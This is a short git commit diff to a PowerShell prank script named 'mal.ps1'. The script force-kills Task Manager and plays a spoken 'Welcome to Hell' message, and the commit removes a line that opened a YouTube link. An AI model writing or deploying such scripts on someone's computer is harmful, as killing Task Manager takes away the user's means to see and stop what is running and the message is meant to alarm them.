ff751e1bb40fec6b50ded511d192eb3da54a2ad4
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-08-16 10:54:28 +1000

    Update mal.ps1
    up

--- mal.ps1
+++ mal.ps1
@@ -2,6 +2,5 @@ sleep 3
 taskkill /F /IM taskmgr.exe
 Add-Type -AssemblyName System.speech
 $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
-$speak.Speak("Well Welcome to Hell");
-start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+$speak.Speak("Well Welcome to Hell, ha ha ha ha ohh.");
 exit
